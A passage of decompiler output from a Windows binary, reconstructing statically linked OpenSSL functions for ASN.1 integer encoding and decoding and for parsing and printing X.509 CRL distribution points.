// 5316C8: using guessed type int dword_5316C8[];

//----- (00430F50) --------------------------------------------------------
int __cdecl sub_430F50(unsigned int *a1, _DWORD *a2)
{
  int v2; // esi
  int result; // eax

  v2 = a1[1] & 0x100;
  if ( v2 != (a2[1] & 0x100) )
    return 2 * (v2 == 0) - 1;
  result = sub_432AD0(a1, a2);
  if ( v2 )
    return -result;
  return result;
}

//----- (00430F90) --------------------------------------------------------
size_t __usercall sub_430F90@<eax>(size_t Size@<ecx>, _BYTE *a2@<edi>, int a3, char **a4)
{
  int v4; // edx
  char v5; // bl
  size_t v6; // esi
  unsigned int v7; // eax
  size_t v8; // ebp
  int v9; // eax
  char *v10; // ecx
  _BYTE *v12; // eax
  char *i; // ecx
  char v14; // dl
  _BYTE *v15; // eax
  char *v16; // ecx
  size_t v17; // esi
  char v18; // dl

  v4 = 0;
  v5 = 0;
  v6 = Size;
  if ( a2 && Size )
  {
    v7 = (unsigned __int8)*a2;
    if ( Size == 1 && !*a2 )
    {
      a3 = 0;
      v8 = 1;
      goto LABEL_18;
    }
    if ( !a3 )
    {
      if ( v7 > 0x7F )
      {
        v4 = 1;
        v5 = 0;
        v8 = Size + 1;
        goto LABEL_18;
      }
      goto LABEL_16;
    }
    if ( v7 <= 0x80 )
    {
      if ( v7 != 128 )
        goto LABEL_16;
      v9 = 1;
      if ( Size <= 1 )
        goto LABEL_16;
      while ( !a2[v9] )
      {
        if ( ++v9 >= Size )
        {
          v8 = Size;
          goto LABEL_18;
        }
      }
    }
    v5 = -1;
    v4 = 1;
LABEL_16:
    v8 = v4 + Size;
    goto LABEL_18;
  }
  v8 = 1;
LABEL_18:
  if ( !a4 )
    return v8;
  v10 = *a4;
  if ( v4 )
    *v10++ = v5;
  if ( !a2 || !v6 )
  {
    *v10 = 0;
LABEL_32:
    *a4 += v8;
    return v8;
  }
  if ( !a3 )
  {
    memcpy(v10, a2, v6);
    *a4 += v8;
    return v8;
  }
  v12 = &a2[v6];
  for ( i = &v10[v6]; !*(v12 - 1); --v6 )
  {
    if ( v6 <= 1 )
      break;
    --i;
    --v12;
    *i = 0;
  }
  v14 = *(v12 - 1);
  v15 = v12 - 1;
  v16 = i - 1;
  v17 = v6 - 1;
  *v16 = -v14;
  if ( !v17 )
    goto LABEL_32;
  do
  {
    v18 = *--v15;
    --v16;
    --v17;
    *v16 = ~v18;
  }
  while ( v17 );
  *a4 += v8;
  return v8;
}

//----- (00431090) --------------------------------------------------------
unsigned int __fastcall sub_431090(char *a1, int *a2, char *a3, unsigned int a4)
{
  unsigned int v4; // ebp
  int v6; // eax
  int v7; // esi
  unsigned int i; // eax
  char *v9; // esi
  char *v10; // edi
  unsigned int j; // ebx
  char *v12; // edi
  char v13; // al
  char *v14; // esi
  unsigned int k; // ebx
  char v16; // cl

  v4 = a4;
  if ( !a4 )
  {
    sub_408310(13, 226, 222, (int)"crypto\\asn1\\a_int.c", 152);
    return 0;
  }
  v6 = *a1 & 0x80;
  if ( a2 )
    *a2 = v6;
  if ( a4 == 1 )
  {
    if ( a3 )
    {
      if ( v6 )
      {
        *a3 = -*a1;
        return 1;
      }
      *a3 = *a1;
    }
    return 1;
  }
  else
  {
    if ( !*a1 || *a1 == -1 )
    {
      v7 = 1;
      if ( v6 == (a1[1] & 0x80) )
      {
        sub_408310(13, 226, 221, (int)"crypto\\asn1\\a_int.c", 174);
        return 0;
      }
    }
    else
    {
      v7 = 0;
    }
    if ( v6 )
    {
      if ( !v7 )
        goto LABEL_27;
      for ( i = 1; i < a4; ++i )
      {
        if ( a1[i] )
          break;
      }
      if ( i == a4 )
      {
        if ( a3 )
        {
          *a3 = 1;
          memset(a3 + 1, 0, a4 - 1);
          return a4;
        }
      }
      else
      {
LABEL_27:
        v4 = a4 - v7;
        if ( a3 )
        {
          v9 = &a1[a4 - 1];
          v10 = &a3[v4];
          for ( j = v4; !*v9; --j )
          {
            if ( !j )
              break;
            --v10;
            --v9;
            *v10 = 0;
          }
          v12 = v10 - 1;
          v13 = -*v9;
          v14 = v9 - 1;
          *v12 = v13;
          if ( !j )
            sub_417C70("assertion failed: i != 0", "crypto\\asn1\\a_int.c", 212);
          for ( k = j - 1; k; *v12 = v16 )
          {
            --v12;
            v16 = ~*v14--;
            --k;
          }
        }
      }
      return v4;
    }
    else
    {
      if ( a3 )
        memcpy(a3, &a1[v7], a4 - v7);
      return a4 - v7;
    }
  }
}
// 431166: conditional instruction was optimized away because %arg_4.4>=2u

//----- (00431210) --------------------------------------------------------
size_t __cdecl sub_431210(int a1, char **a2)
{
  return sub_430F90(*(_DWORD *)a1, *(_BYTE **)(a1 + 8), *(_DWORD *)(a1 + 4) & 0x100, a2);
}

//----- (00431240) --------------------------------------------------------
int __usercall sub_431240@<eax>(_DWORD *a1@<ecx>, int a2@<ebx>, unsigned int a3@<edi>)
{
  unsigned int v4; // esi
  int v5; // edx

  if ( a3 <= 8 )
  {
    v4 = 0;
    *a1 = 0;
    a1[1] = 0;
    if ( a2 )
    {
      if ( a3 )
      {
        do
        {
          v5 = *(_QWORD *)a1 >> 24;
          *a1 <<= 8;
          a1[1] = v5;
          *(_QWORD *)a1 |= *(unsigned __int8 *)(v4 + a2);
          ++v4;
        }
        while ( v4 < a3 );
      }
      return 1;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    sub_408310(13, 225, 223, (int)"crypto\\asn1\\a_int.c", 230);
    return 0;
  }
}

//----- (004312B0) --------------------------------------------------------
int __usercall sub_4312B0@<eax>(_BYTE *a1@<ebx>, unsigned __int64 a2)
{
  unsigned int v2; // ecx
  unsigned int v3; // esi
  int result; // eax
  unsigned int v5; // edx
  unsigned int v6; // edi
  _BYTE *v7; // edx

  v3 = HIDWORD(a2);
  v2 = a2;
  if ( a2 < 0x100 )
  {
    *a1 = a2;
    return 1;
  }
  else
  {
    result = 0;
    v6 = HIDWORD(a2);
    v5 = a2;
    do
    {
      v5 = __PAIR64__(v6, v5) >> 8;
      v6 >>= 8;
      ++result;
    }
    while ( __PAIR64__(v6, v5) );
    v7 = &a1[result - 1];
    do
    {
      *v7 = v2;
      v2 = __PAIR64__(v3, v2) >> 8;
      --v7;
      v3 >>= 8;
    }
    while ( v7 >= a1 );
  }
  return result;
}
// 4312D1: conditional instruction was optimized away because %arg_0.8>=100u

//----- (00431300) --------------------------------------------------------
int __usercall sub_431300@<eax>(int a1@<ebx>, unsigned int a2@<edi>, int *a3@<esi>, int a4)
{
  int v4; // eax
  int v5; // ecx
  unsigned __int64 v7; // [esp+0h] [ebp-8h] BYREF

  if ( !sub_431240(&v7, a1, a2) )
    return 0;
  v4 = HIDWORD(v7);
  v5 = v7;
  if ( a4 )
  {
    if ( v7 > 0x8000000000000000ui64 )
    {
      sub_408310(13, 224, 224, (int)"crypto\\asn1\\a_int.c", 289);
      return 0;
    }
    v5 = -(int)v7;
    v4 = (unsigned __int64)-(__int64)v7 >> 32;
  }
  else if ( (v7 & 0x8000000000000000ui64) != 0i64 )
  {
    sub_408310(13, 224, 223, (int)"crypto\\asn1\\a_int.c", 295);
    return 0;
  }
  a3[1] = v4;
  *a3 = v5;
  return 1;
}

//----- (00431390) --------------------------------------------------------
int __cdecl sub_431390(int *a1, char **a2, size_t Size)
{
  char *v3; // edx
  unsigned int v4; // ebx
  char v6; // cl
  signed int v7; // esi
  int v8; // edi
  _DWORD *v9; // eax
  int v10; // ecx
  size_t i; // eax
  char **v12; // esi

  v3 = *a2;
  v4 = Size;
  if ( !Size )
  {
    sub_408310(13, 226, 222, (int)"crypto\\asn1\\a_int.c", 152);
    return 0;
  }
  v6 = *v3;
  if ( Size == 1 )
  {
    v7 = 1;
  }
  else
  {
    if ( !v6 || v6 == -1 )
    {
      v10 = 1;
      if ( (*v3 & 0x80) == (v3[1] & 0x80) )
      {
        sub_408310(13, 226, 221, (int)"crypto\\asn1\\a_int.c", 174);
        return 0;
      }
    }
    else
    {
      v10 = 0;
    }
    if ( (*v3 & 0x80) == 0 || !v10 )
      goto LABEL_26;
    for ( i = 1; i < Size; ++i )
    {
      if ( v3[i] )
        break;
    }
    if ( i == Size )
      v7 = Size;
    else
LABEL_26:
      v7 = Size - v10;
    if ( !v7 )
      return 0;
  }
  if ( !a1 || (v8 = *a1) == 0 )
  {
    v9 = sub_42C490();
    v8 = (int)v9;
    if ( !v9 )
      return 0;
    v9[1] = 2;
  }
  if ( !sub_432910(v8, 0, v7) )
  {
    sub_408310(13, 194, 65, (int)"crypto\\asn1\\a_int.c", 337);
    if ( !a1 || *a1 != v8 )
      sub_42C4F0((void *)v8);
    return 0;
  }
  v12 = a2;
  sub_431090(*a2, (int *)&a2, *(char **)(v8 + 8), v4);
  if ( a2 )
    *(_DWORD *)(v8 + 4) |= 0x100u;
  *v12 += v4;
  if ( a1 )
    *a1 = v8;
  return v8;
}
// 431459: conditional instruction was optimized away because %Size.4>=2u

//----- (004314F0) --------------------------------------------------------
int __usercall sub_4314F0@<eax>(unsigned int *a1@<ecx>, int *a2@<esi>, int a3)
{
  unsigned int v4; // eax

  if ( a1 )
  {
    v4 = a1[1];
    if ( (v4 & 0xFFFFFEFF) == a3 )
    {
      return sub_431300(a1[2], *a1, a2, v4 & 0x100);
    }
    else
    {
      sub_408310(13, 227, 225, (int)"crypto\\asn1\\a_int.c", 350);
      return 0;
    }
  }
  else
  {
    sub_408310(13, 227, 67, (int)"crypto\\asn1\\a_int.c", 346);
    return 0;
  }
}

//----- (00431560) --------------------------------------------------------
signed int __usercall sub_431560@<eax>(int a1@<esi>, signed __int64 a2, int a3)
{
  signed int result; // eax
  char Src[8]; // [esp+4h] [ebp-Ch] BYREF

  *(_DWORD *)(a1 + 4) = a3;
  if ( a2 < 0 )
  {
    result = sub_4312B0(Src, -a2);
    *(_DWORD *)(a1 + 4) |= 0x100u;
  }
  else
  {
    result = sub_4312B0(Src, a2);
    *(_DWORD *)(a1 + 4) &= ~0x100u;
  }
  if ( result )
    return sub_432910(a1, Src, result);
  return result;
}

//----- (00431600) --------------------------------------------------------
int __cdecl sub_431600(_DWORD *a1, unsigned int *a2, int a3)
{
  unsigned int v4; // ecx

  if ( a2 )
  {
    v4 = a2[1];
    if ( (v4 & 0xFFFFFEFF) == a3 )
    {
      if ( (v4 & 0x100) != 0 )
      {
        sub_408310(13, 230, 226, (int)"crypto\\asn1\\a_int.c", 385);
        return 0;
      }
      else
      {
        return sub_431240(a1, a2[2], *a2);
      }
    }
    else
    {
      sub_408310(13, 230, 225, (int)"crypto\\asn1\\a_int.c", 381);
      return 0;
    }
  }
  else
  {
    sub_408310(13, 230, 67, (int)"crypto\\asn1\\a_int.c", 377);
    return 0;
  }
}

//----- (004316A0) --------------------------------------------------------
_DWORD *__usercall sub_4316A0@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3)
{
  _DWORD *v3; // edi
  int v4; // esi

  if ( a1 )
  {
    v3 = a1;
    a1[1] = a3;
  }
  else
  {
    v3 = sub_4329F0(a3);
  }
  if ( !v3 )
  {
    sub_408310(13, 229, 58, (int)"crypto\\asn1\\a_int.c", 484);
LABEL_13:
    if ( v3 != a1 )
      sub_42C4F0(v3);
    return 0;
  }
  if ( sub_416E40((int)a2) && !sub_416DB0((int)a2) )
    v3[1] |= 0x102u;
  v4 = (sub_416F90(a2) + 7) / 8;
  if ( !v4 )
    v4 = 1;
  if ( !sub_432910((int)v3, 0, v4) )
  {
    sub_408310(13, 229, 65, (int)"crypto\\asn1\\a_int.c", 497);
    goto LABEL_13;
  }
  if ( sub_416DB0((int)a2) )
  {
    *(_BYTE *)v3[2] = 0;
    *v3 = v4;
  }
  else
  {
    *v3 = sub_417300(a2, (char *)v3[2]);
  }
  return v3;
}

//----- (00431790) --------------------------------------------------------
int __usercall sub_431790@<eax>(int a1@<esi>, int a2, int a3)
{
  int v4; // eax
  int v5; // edi

  if ( (*(_DWORD *)(a1 + 4) & 0xFFFFFEFF) == a3 )
  {
    v4 = sub_4174D0(*(_BYTE **)(a1 + 8), *(_DWORD *)a1, a2);
    v5 = v4;
    if ( v4 )
    {
      if ( (*(_DWORD *)(a1 + 4) & 0x100) != 0 )
        sub_417390(v4, 1);
      return v5;
    }
    else
    {
      sub_408310(13, 228, 105, (int)"crypto\\asn1\\a_int.c", 526);
      return 0;
    }
  }
  else
  {
    sub_408310(13, 228, 225, (int)"crypto\\asn1\\a_int.c", 520);
    return 0;
  }
}

//----- (00431820) --------------------------------------------------------
int __cdecl sub_431820(_DWORD *a1, unsigned int *a2)
{
  return sub_431600(a1, a2, 2);
}

//----- (00431840) --------------------------------------------------------
signed int __cdecl sub_431840(int a1, int a2)
{
  return sub_431560(a1, a2, 2);
}

//----- (00431860) --------------------------------------------------------
int __cdecl sub_431860(unsigned int *a1)
{
  int result; // eax
  __int64 v2; // [esp+0h] [ebp-8h] BYREF

  if ( !a1 )
    return 0;
  if ( !sub_4314F0(a1, (int *)&v2, 2) )
    return -1;
  result = v2;
  if ( (unsigned __int64)(v2 + 0x80000000i64) >> 32 )
    return -1;
  return result;
}

//----- (004318B0) --------------------------------------------------------
_DWORD *__cdecl sub_4318B0(_DWORD *a1, _DWORD *a2)
{
  return sub_4316A0(a2, a1, 2);
}

//----- (004318D0) --------------------------------------------------------
int __cdecl sub_4318D0(int a1, int a2)
{
  return sub_431790(a1, a2, 2);
}

//----- (004318F0) --------------------------------------------------------
int __cdecl sub_4318F0(unsigned int *a1)
{
  int result; // eax
  __int64 v2; // [esp+0h] [ebp-8h] BYREF

  if ( !a1 )
    return 0;
  if ( (a1[1] & 0xFFFFFEFF) != 10 )
    return -1;
  if ( (int)*a1 > 4 )
    return -1;
  if ( !sub_4314F0(a1, (int *)&v2, 10) )
    return -1;
  result = v2;
  if ( (unsigned __int64)(v2 + 0x80000000i64) >> 32 )
    return -1;
  return result;
}

//----- (00431960) --------------------------------------------------------
int __cdecl sub_431960(int a1, int a2)
{
  return sub_431790(a1, a2, 10);
}

//----- (004319A0) --------------------------------------------------------
int __cdecl sub_4319A0(int *a1, int a2)
{
  if ( a1 && sub_426A30((int)a1) > a2 && a2 >= 0 )
    return sub_426A40(a1, a2);
  else
    return 0;
}

//----- (004319D0) --------------------------------------------------------
int __cdecl sub_4319D0(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return a1 + 8;
  return result;
}

//----- (004319E0) --------------------------------------------------------
BOOL __cdecl sub_4319E0(int a1)
{
  BOOL result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)(a1 + 4) > 0;
  return result;
}

//----- (00431A00) --------------------------------------------------------
int __cdecl sub_431A00(int *a1, unsigned int a2, int a3)
{
  char **v3; // eax

  v3 = sub_423310(a2);
  if ( v3 )
    return sub_454900(a1, (int)v3, a3);
  else
    return -2;
}

//----- (00431A20) --------------------------------------------------------
int __cdecl sub_431A20(int a1, int a2, BOOL *a3, int *a4)
{
  return sub_44CDB0(*(int **)(a1 + 28), a2, a3, a4);
}

//----- (00431A30) --------------------------------------------------------
int __cdecl sub_431A30(int a1)
{
  int result; // eax
  int v2; // [esp+4h] [ebp+4h]

  v2 = *(_DWORD *)(a1 + 56);
  result = v2;
  if ( v2 )
    return sub_426A30(v2);
  return result;
}

//----- (00431A40) --------------------------------------------------------
int __cdecl sub_431A40(int a1, unsigned int a2, int a3)
{
  return sub_431A00(*(int **)(a1 + 56), a2, a3);
}

//----- (00431A50) --------------------------------------------------------
int __cdecl sub_431A50(int a1, int a2)
{
  return sub_4319A0(*(int **)(a1 + 56), a2);
}

//----- (00431A60) --------------------------------------------------------
int __cdecl sub_431A60(int a1, int a2, BOOL *a3, int *a4)
{
  return sub_44CDB0(*(int **)(a1 + 56), a2, a3, a4);
}

//----- (00431A70) --------------------------------------------------------
int __cdecl sub_431A70(int a1, int a2, BOOL *a3, int *a4)
{
  return sub_44CDB0(*(int **)(a1 + 20), a2, a3, a4);
}

//----- (00431A80) --------------------------------------------------------
int *__usercall sub_431A80@<eax>(int a1@<ebx>, const char *a2@<edi>)
{
  int *v2; // eax
  int *v3; // esi
  int *v5; // ebp

  if ( *a2 == 64 )
    v2 = (int *)sub_44DE80(a1);
  else
    v2 = (int *)sub_44D8A0(a2);
  v3 = v2;
  if ( v2 )
  {
    v5 = sub_44ED40(0, a1, v2);
    if ( *a2 == 64 )
      sub_44DEC0(a1, (int)v3);
    else
      sub_426C00(v3, (void (__cdecl *)(_DWORD))sub_44D000);
    return v5;
  }
  else
  {
    sub_408310(34, 156, 150, (int)"crypto\\x509v3\\v3_crld.c", 55);
    return 0;
  }
}

//----- (00431B00) --------------------------------------------------------
int __cdecl sub_431B00(signed int **a1, const char *Src)
{
  int v2; // ebp
  int *v3; // eax
  int *v4; // ebx
  signed int **v6; // esi
  const char *v7; // edi
  signed int *v8; // eax
  char *v9; // esi
  int v10; // [esp+8h] [ebp-4h]

  v2 = 0;
  v10 = 0;
  v3 = (int *)sub_44D8A0(Src);
  v4 = v3;
  if ( !v3 )
    return 0;
  v6 = a1;
  if ( !*a1 )
  {
    if ( sub_426A30((int)v3) <= 0 )
    {
LABEL_16:
      v10 = 1;
    }
    else
    {
      while ( 1 )
      {
        v7 = *(const char **)(sub_426A40(v4, v2) + 4);
        if ( !*v6 )
        {
          v8 = sub_42C4E0();
          *v6 = v8;
          if ( !v8 )
            break;
        }
        v9 = (char *)&unk_505F38;
        if ( "Unused" )
        {
          while ( strcmp(*((const char **)v9 + 2), v7) )
          {
            v9 += 12;
            if ( !*((_DWORD *)v9 + 1) )
              goto LABEL_14;
          }
          if ( !sub_4378A0(*a1, *(_DWORD *)v9, 1) )
            break;
        }
LABEL_14:
        if ( !*((_DWORD *)v9 + 1) )
          break;
        if ( ++v2 >= sub_426A30((int)v4) )
          goto LABEL_16;
        v6 = a1;
      }
    }
  }
  sub_426C00(v4, (void (__cdecl *)(_DWORD))sub_44D000);
  return v10;
}
// 505F3C: using guessed type char *off_505F3C[2];

//----- (00431C10) --------------------------------------------------------
int __usercall sub_431C10@<eax>(const char *a1@<edx>, int a2@<edi>, _DWORD *a3, int a4)
{
  int v4; // ebx
  int *v5; // esi

  v4 = 1;
  sub_419190(a2, "%*s%s:\n%*s", a4, byte_4F1291, a1, a4 + 2, byte_4F1291);
  if ( !"Unused" )
    goto LABEL_10;
  v5 = (int *)off_505F3C;
  do
  {
    if ( sub_4379A0(a3, *(v5 - 1)) )
    {
      if ( v4 )
        v4 = 0;
      else
        sub_4051D0(a2, (int)", ");
      sub_4051D0(a2, *v5);
    }
    v5 += 3;
  }
  while ( *v5 );
  if ( !v4 )
  {
    sub_4051D0(a2, (int)"\n");
    return 1;
  }
  else
  {
LABEL_10:
    sub_4051D0(a2, (int)"<EMPTY>\n");
    return 1;
  }
}
// 505F3C: using guessed type char *off_505F3C[2];

//----- (00431CC0) --------------------------------------------------------
int __cdecl sub_431CC0(int a1, int *a2)
{
  int v2; // ecx

  v2 = *a2;
  if ( a1 == 1 )
  {
    *(_DWORD *)(v2 + 8) = 0;
  }
  else if ( a1 == 3 )
  {
    sub_42C9E0(*(_DWORD *)(v2 + 8));
    return 1;
  }
  return 1;
}

//----- (00431D00) --------------------------------------------------------
void *sub_431D00()
{
  return &unk_505FF0;
}

//----- (00431D10) --------------------------------------------------------
void *sub_431D10()
{
  return &unk_506048;
}

//----- (00431D20) --------------------------------------------------------
void __cdecl sub_431D20(int a1)
{
  sub_42FEF0(a1, (int)&unk_506048);
}

//----- (00431D40) --------------------------------------------------------
void *sub_431D40()
{
  return &unk_506078;
}

//----- (00431D50) --------------------------------------------------------
void __cdecl sub_431D50(int a1)
{
  sub_42FEF0(a1, (int)&unk_506078);
}

//----- (00431D70) --------------------------------------------------------
void *sub_431D70()
{
  return &unk_506094;
}

//----- (00431D80) --------------------------------------------------------
void __cdecl sub_431D80(int a1)
{
  sub_42FEF0(a1, (int)&unk_506094);
}

//----- (00431DA0) --------------------------------------------------------
int __usercall sub_431DA0@<eax>(int *a1@<ebx>, int a2@<edi>, int a3)
{
  int v3; // esi
  int v4; // eax
  int v6; // [esp+0h] [ebp-8h]

  v3 = 0;
  if ( sub_426A30(v6) > 0 )
  {
    do
    {
      sub_419190(a2, "%*s", a3 + 2, byte_4F1291);
      v4 = sub_426A40(a1, v3);
      sub_44E1B0(a2, v4);
      sub_4051D0(a2, (int)"\n");
      ++v3;
    }
    while ( v3 < sub_426A30((int)a1) );
  }
  return 1;
}
// 431DA4: variable 'v6' is possibly undefined

//----- (00431E00) --------------------------------------------------------
int __usercall sub_431E00@<eax>(int a1@<edx>, int a2@<ecx>, int a3@<esi>)
{
  int v6[5]; // [esp+8h] [ebp-14h] BYREF

  if ( *(_DWORD *)a2 )
  {
    v6[0] = *(_DWORD *)(a2 + 4);
    sub_419190(a1, "%*sRelative Name:\n%*s", a3, byte_4F1291, a3 + 2, byte_4F1291);
    sub_445220(a1, v6, 0, 8520479);
    sub_4051D0(a1, (int)"\n");
  }
  else
  {
    sub_419190(a1, "%*sFull Name:\n", a3, byte_4F1291);
    sub_431DA0(*(int **)(a2 + 4), a1, a3);
  }
  return 1;
}
// 431E00: using guessed type int var_14[5];

//----- (00431E90) --------------------------------------------------------
int __cdecl sub_431E90(int a1, int *a2, int a3, int a4)
{
  _DWORD *v4; // eax

  if ( *a2 )
    sub_431E00(a3, *a2, a4);
  if ( a2[1] > 0 )
    sub_419190(a3, "%*sOnly User Certificates\n", a4, byte_4F1291);
  if ( a2[2] > 0 )
    sub_419190(a3, "%*sOnly CA Certificates\n", a4, byte_4F1291);
  if ( a2[4] > 0 )
    sub_419190(a3, "%*sIndirect CRL\n", a4, byte_4F1291);
  v4 = (_DWORD *)a2[3];
  if ( v4 )
    sub_431C10("Only Some Reasons", a3, v4, a4);
  if ( a2[5] > 0 )
    sub_419190(a3, "%*sOnly Attribute Certificates\n", a4, byte_4F1291);
  if ( !*a2 && a2[1] <= 0 && a2[2] <= 0 && a2[4] <= 0 && !a2[3] && a2[5] <= 0 )
    sub_419190(a3, "%*s<EMPTY>\n", a4, byte_4F1291);
  return 1;
}

//----- (00431F70) --------------------------------------------------------
int __cdecl sub_431F70(int a1, int *a2, int a3, int a4)
{
  int i; // ebp
  int v5; // ebx
  _DWORD *v6; // eax

  for ( i = 0; i < sub_426A30((int)a2); ++i )
  {
    sub_4051D0(a3, (int)"\n");
    v5 = sub_426A40(a2, i);
    if ( *(_DWORD *)v5 )
      sub_431E00(a3, *(_DWORD *)v5, a4);
    v6 = *(_DWORD **)(v5 + 4);
    if ( v6 )
      sub_431C10("Reasons", a3, v6, a4);
    if ( *(_DWORD *)(v5 + 8) )
    {
      sub_419190(a3, "%*sCRL Issuer:\n", a4, byte_4F1291);
      sub_431DA0(*(int **)(v5 + 8), a3, a4);
    }
  }
  return 1;
}

//----- (00432010) --------------------------------------------------------
int __cdecl sub_432010(int a1, void *a2)
{
  int *v2; // ebx
  int result; // eax
  int v4; // esi
  void *v5; // eax

  if ( !a1 || *(_DWORD *)a1 != 1 )
    return 1;
  v2 = *(int **)(a1 + 4);
  result = (int)sub_42CA00(a2);
  *(_DWORD *)(a1 + 8) = result;
  if ( !result )
    return result;
  v4 = 0;
  if ( sub_426A30((int)v2) > 0 )
  {
    do
    {
      v5 = (void *)sub_426A40(v2, v4);
      if ( !sub_44EF60(*(int **)(a1 + 8), v5, -1, v4 == 0) )
        goto LABEL_8;
    }
    while ( ++v4 < sub_426A30((int)v2) );
  }
  if ( sub_42C9B0(*(_DWORD *)(a1 + 8), 0) < 0 )
  {
LABEL_8:
    sub_42C9E0(*(_DWORD *)(a1 + 8));
    *(_DWORD *)(a1 + 8) = 0;
    return 0;
  }
  return 1;
}

//----- (004320D0) --------------------------------------------------------
int __cdecl sub_4320D0(int a1, int a2)
{
  int v2; // ecx
  int v3; // edi
  void *v4; // ebp
  int *v5; // edi
  int *v6; // esi
  int *v7; // eax
  int v8; // edi
  int v10; // ebx
  int v11; // eax
  _DWORD *v12; // eax

  v3 = v2;
  v4 = 0;
  if ( !strncmp(*(const char **)(v2 + 4), "fullname", 9u) )
  {
    v5 = sub_431A80(a2, *(const char **)(v3 + 8));
    if ( v5 )
      goto LABEL_16;
LABEL_14:
    sub_426C00(v5, sub_4332D0);
    sub_426C00(v4, sub_42C950);
    return -1;
  }
  if ( strcmp(*(const char **)(v3 + 4), "relativename") )
    return 0;
  v6 = (int *)sub_42C9D0();
  if ( !v6 )
    return -1;
  v7 = (int *)sub_44DE80(a2);
  v8 = (int)v7;
  if ( !v7 )
  {
    sub_408310(34, 158, 150, (int)"crypto\\x509v3\\v3_crld.c", 86);
    return -1;
  }
  v10 = sub_44D7F0(v6, v7, 4097);
  sub_44DEC0(a2, v8);
  v4 = (void *)*v6;
  *v6 = 0;
  sub_42C9E0((int)v6);
  if ( !v10 || sub_426A30((int)v4) <= 0 )
  {
LABEL_13:
    v5 = 0;
    goto LABEL_14;
  }
  v11 = sub_426A30((int)v4);
  if ( *(_DWORD *)(sub_426A40((int *)v4, v11 - 1) + 8) )
  {
    sub_408310(34, 158, 161, (int)"crypto\\x509v3\\v3_crld.c", 102);
    goto LABEL_13;
  }
  v5 = 0;
LABEL_16:
  if ( *(_DWORD *)a1 )
  {
    sub_408310(34, 158, 160, (int)"crypto\\x509v3\\v3_crld.c", 110);
    goto LABEL_14;
  }
  v12 = (_DWORD *)sub_42FB20((int)&unk_505FF0);
  *(_DWORD *)a1 = v12;
  if ( !v12 )
    goto LABEL_14;
  if ( v5 )
  {
    *v12 = 0;
    *(_DWORD *)(*(_DWORD *)a1 + 4) = v5;
  }
  else
  {
    *v12 = 1;
    *(_DWORD *)(*(_DWORD *)a1 + 4) = v4;
  }
  return 1;
}
// 4320DE: variable 'v2' is possibly undefined

//----- (004322A0) --------------------------------------------------------
int __cdecl sub_4322A0(int a1, int a2)
{
  int v2; // ebp
  int *v3; // esi
  int v4; // ebx
  int v5; // edi
  int v6; // eax
  int *v8; // eax
  int i; // [esp+10h] [ebp-4h]

  v2 = sub_42FB20((int)&unk_506048);
  if ( v2 )
  {
    v3 = (int *)a2;
    v4 = 0;
    for ( i = 0; v4 < sub_426A30(a2); i = v4 )
    {
      v5 = sub_426A40(v3, v4);
      v6 = sub_4320D0(v2, a1);
      if ( v6 <= 0 )
      {
        if ( v6 < 0 )
          goto LABEL_7;
        if ( !strcmp(*(const char **)(v5 + 4), "reasons") )
        {
          if ( !sub_431B00((signed int **)(v2 + 4), *(const char **)(v5 + 8)) )
            goto LABEL_7;
        }
        else if ( !strcmp(*(const char **)(v5 + 4), "CRLissuer") )
        {
          v8 = sub_431A80(a1, *(const char **)(v5 + 8));
          *(_DWORD *)(v2 + 8) = v8;
          if ( !v8 )
            goto LABEL_7;
          v4 = i;
        }
      }
      v3 = (int *)a2;
      ++v4;
    }
    return v2;
  }
  else
  {
LABEL_7:
    sub_42FEF0(v2, (int)&unk_506048);
    return 0;
  }
}

//----- (004323E0) --------------------------------------------------------
int *__cdecl sub_4323E0(int a1, int a2, int *a3)
{
  int v3; // edi
  _DWORD *v4; // ebp
  int v5; // eax
  int v6; // eax
  int v7; // esi
  int v8; // edi
  int *v9; // eax
  int *v10; // esi
  int v11; // eax
  int v13; // [esp+10h] [ebp-Ch]
  int *Block; // [esp+14h] [ebp-8h]
  int v15; // [esp+18h] [ebp-4h]

  v3 = 0;
  v13 = 0;
  v4 = 0;
  Block = sub_426AF0();
  if ( !Block )
    goto LABEL_19;
  v15 = 0;
  if ( sub_426A30((int)a3) <= 0 )
    return Block;
  while ( 1 )
  {
    v5 = sub_426A40(a3, v3);
    if ( *(_DWORD *)(v5 + 8) )
      break;
    v6 = sub_44DE80(a2);
    v7 = v6;
    if ( !v6 )
      goto LABEL_20;
    v8 = sub_4322A0(a2, v6);
    sub_44DEC0(a2, v7);
    if ( !v8 )
      goto LABEL_20;
    if ( !sub_4269B0(Block, v8) )
    {
      sub_42FEF0(v8, (int)&unk_506048);
      goto LABEL_19;
    }
    v3 = v15;
LABEL_15:
    v15 = ++v3;
    if ( v3 >= sub_426A30((int)a3) )
      return Block;
  }
  v4 = sub_44EAA0(a1, a2, v5);
  if ( !v4 )
    goto LABEL_20;
  v9 = (int *)sub_433300();
  v13 = (int)v9;
  if ( !v9 )
    goto LABEL_19;
  if ( !sub_4269B0(v9, (int)v4) )
    goto LABEL_19;
  v4 = 0;
  v10 = (int *)sub_42FB20((int)&unk_506048);
  if ( !v10 )
    goto LABEL_19;
  if ( sub_4269B0(Block, (int)v10) )
  {
    v11 = sub_42FB20((int)&unk_505FF0);
    *v10 = v11;
    if ( !v11 )
      goto LABEL_19;
    *(_DWORD *)(v11 + 4) = v13;
    *(_DWORD *)*v10 = 0;
    v13 = 0;
    goto LABEL_15;
  }
  sub_42FEF0((int)v10, (int)&unk_506048);
LABEL_19:
  sub_408310(34, 134, 65, (int)"crypto\\x509v3\\v3_crld.c", 288);
LABEL_20:
  sub_4332D0((int)v4);
  sub_433310(v13);
  sub_426C00(Block, sub_431D20);
  return 0;
}

//----- (004325A0) --------------------------------------------------------
int __cdecl sub_4325A0(int a1, int a2, int *a3)
{
  int v3; // ebx
  _DWORD *v4; // edi
  const char *v5; // esi
  const char *v6; // ebp
  int v7; // eax
  int v8; // eax
  int v10; // [esp+10h] [ebp-4h]

  v3 = sub_42FB20((int)&unk_506094);
  if ( !v3 )
  {
    sub_408310(34, 157, 65, (int)"crypto\\x509v3\\v3_crld.c", 406);
    goto LABEL_20;
  }
  v10 = 0;
  if ( sub_426A30((int)a3) <= 0 )
    return v3;
  while ( 1 )
  {
    v4 = (_DWORD *)sub_426A40(a3, v10);
    v5 = (const char *)v4[1];
    v6 = (const char *)v4[2];
    v7 = sub_4320D0(v3, a2);
    if ( v7 <= 0 )
      break;
LABEL_17:
